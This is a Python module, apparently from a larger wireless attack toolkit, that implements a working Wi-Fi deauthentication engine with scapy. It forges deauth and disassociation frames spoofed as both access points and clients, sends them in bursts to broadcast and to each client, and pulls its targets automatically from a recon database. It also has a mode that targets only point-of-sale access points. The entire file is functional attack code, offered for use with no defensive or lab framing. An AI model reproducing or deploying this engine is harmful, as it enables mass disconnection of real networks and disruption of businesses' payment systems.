"""
Deauthentication Engine
───────────────────────
Sends targeted deauth/disassoc frames in three directions:
  1. AP -> Client (spoofed as AP)
  2. Client -> AP (spoofed as client)
  3. AP -> Broadcast (mass disconnect)

Targets are populated from the recon database — no manual input needed.
"""

import time
import threading
from collections import defaultdict

from scapy.all import sendp
from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11Disas, RadioTap

from .config import (
    DEAUTH_BURST_COUNT, DEAUTH_BURST_INTERVAL, WIFI_BROADCAST, log,
)


class DeauthEngine:
    """
    Deauth attack engine that automatically targets BSSIDs and their clients
    using data from the recon scanner's database.
    """

    def __init__(self, interface, verify_callback=None):
        self.interface = interface
        self.running = False
        self._targets = defaultdict(set)  # bssid -> {client_mac, ...}
        self._thread = None
        self.verify_callback = verify_callback

    def add_target(self, bssid, clients=None):
        """Add a BSSID and its known clients as deauth targets."""
        if clients:
            self._targets[bssid].update(clients)
        else:
            self._targets[bssid]

    def add_targets_from_db(self, db):
        """
        Auto-populate targets from recon database.
        Pulls all APs and their associated clients.
        """
        ap_clients = db.get_all_ap_clients()
        for bssid, clients in ap_clients.items():
            self._targets[bssid].update(clients)
        log.info(f"Deauth auto-target: {len(self._targets)} APs, "
                 f"{sum(len(c) for c in self._targets.values())} clients")

    def add_pos_targets_from_db(self, db):
        """
        Auto-populate targets with POS APs only (surgical targeting).
        """
        pos_aps = db.get_pos_access_points()
        for row in pos_aps:
            bssid = row[0]
            clients = db.get_clients_for_bssid(bssid)
            # get_clients_for_bssid returns [(mac, rssi), ...] tuples
            self._targets[bssid].update(mac for mac, rssi in clients)
        log.info(f"Deauth POS-target: {len(self._targets)} POS APs")

    def remove_target(self, bssid):
        self._targets.pop(bssid, None)

    def _craft_deauth(self, sender, receiver, bssid):
        deauth = (
            RadioTap() /
            Dot11(type=0, subtype=12, addr1=receiver, addr2=sender, addr3=bssid) /
            Dot11Deauth(reason=7)
        )
        disassoc = (
            RadioTap() /
            Dot11(type=0, subtype=10, addr1=receiver, addr2=sender, addr3=bssid) /
            Dot11Disas(reason=8)
        )
        return [deauth, disassoc]

    def _deauth_loop(self):
        while self.running:
            try:
                for bssid, clients in list(self._targets.items()):
                    # Broadcast deauth (hits all clients)
                    for frame in self._craft_deauth(bssid, WIFI_BROADCAST, bssid):
                        try:
                            sendp(frame, iface=self.interface, count=DEAUTH_BURST_COUNT,
                                  inter=0.02, verbose=False)
                        except Exception as e:
                            log.error(f"Deauth send failed for {bssid}: {e}")
                    # Per-client targeted deauth (3-way)
                    for client_mac in list(clients):
                        for frame in self._craft_deauth(bssid, client_mac, bssid):
                            try:
                                sendp(frame, iface=self.interface, count=DEAUTH_BURST_COUNT,
                                      inter=0.02, verbose=False)
                            except Exception as e:
                                log.error(f"Deauth send failed for {client_mac}: {e}")
                        for frame in self._craft_deauth(client_mac, bssid, bssid):
                            try:
                                sendp(frame, iface=self.interface, count=DEAUTH_BURST_COUNT,
                                      inter=0.02, verbose=False)
                            except Exception as e:
                                log.error(f"Deauth send failed for {client_mac} -> AP: {e}")
                        # Optionally verify deauth effectiveness
                        if self.verify_callback:
                            try:
                                self.verify_callback(bssid, client_mac)
                            except Exception as e:
                                log.debug(f"Deauth verify callback error: {e}")
                time.sleep(DEAUTH_BURST_INTERVAL)
            except Exception as e:
                log.error(f"Deauth loop error: {e}")
                if not self.running:
                    break
                time.sleep(1)  # Prevent tight error loop

    def start(self):
        if self.running:
            return
        if not self._targets:
            log.warning("Deauth engine has no targets")
            return
        self.running = True
        self._thread = threading.Thread(target=self._deauth_loop, daemon=True)
        self._thread.start()
        log.info(f"Deauth engine started: {len(self._targets)} BSSIDs")

    def stop(self):
        self.running = False
        if self._thread:
            self._thread.join(timeout=5)
        log.info("Deauth engine stopped")
